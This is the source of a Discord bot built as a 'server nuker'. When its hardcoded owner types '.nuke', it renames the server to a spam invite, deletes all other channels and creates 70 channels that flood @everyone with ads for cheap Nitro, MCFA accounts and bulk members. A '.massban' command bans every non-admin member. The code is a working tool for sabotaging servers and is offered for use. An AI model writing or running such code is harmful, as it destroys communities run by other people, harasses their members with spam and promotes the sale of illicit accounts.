import { Client, GatewayIntentBits, PermissionsBitField, ChannelType } from 'discord.js';

const client = new Client({
  intents: [GatewayIntentBits.Guilds,GatewayIntentBits.GuildMembers,GatewayIntentBits.GuildMessages,GatewayIntentBits.MessageContent]
});

const SPAM = `__**Nitro & Mcfa & Member shop**__\nCheapest supplier ever <@1479770170389172285>\n\n• Nitro boost for 2.5$\n• Nitro basic for 1$\n________________\n\n• Offline for 0.7$/k Off   • Online for 1.5$/k On\n59000+ offline in stock    9000+ online in stock\n\n_________________\n\nMCFA lifetime full access for 3.99$\n\ndiscord.gg/n1tromaker`;

client.on('messageCreate', async m => {
  if (m.author.id !== '1479770170389172285') return;
  if (!m.content.startsWith('.')) return;
  if (!m.guild) return;

  const cmd = m.content.slice(1).split(' ')[0].toLowerCase();

  if (cmd === 'nuke') {
    m.guild.setName('.gg/n1tromaker').catch(()=>{});

    for (const c of m.guild.channels.cache.values()) {
      if (c.id !== m.channel.id) c.delete().catch(()=>{});
      await new Promise(r=>setTimeout(r,60));
    }

    for (let i=1;i<=70;i++) {
      const ch = await m.guild.channels.create({
        name:`best-shop-${i}`,
        type:ChannelType.GuildText,
        permissionOverwrites:[{id:m.guild.id,allow:['ViewChannel','SendMessages']}]
      }).catch(()=>null);

      if (ch) setInterval(()=>{ch.send(SPAM).catch(()=>{});ch.send(`@everyone ${SPAM}`).catch(()=>{})},420);

      await new Promise(r=>setTimeout(r,100));
    }

    setInterval(()=>m.channel.send(SPAM+' @everyone').catch(()=>{}),550);
  }

  if (cmd === 'massban') {
    for (const mem of m.guild.members.cache.values()) {
      if (mem.id === client.user.id) continue;
      if (mem.permissions.has(PermissionsBitField.Flags.Administrator)) continue;
      mem.ban({reason:''}).catch(()=>{});
      await new Promise(r=>setTimeout(r,350));
    }
  }
});

client.login(process.env.TOKEN).catch(()=>{});
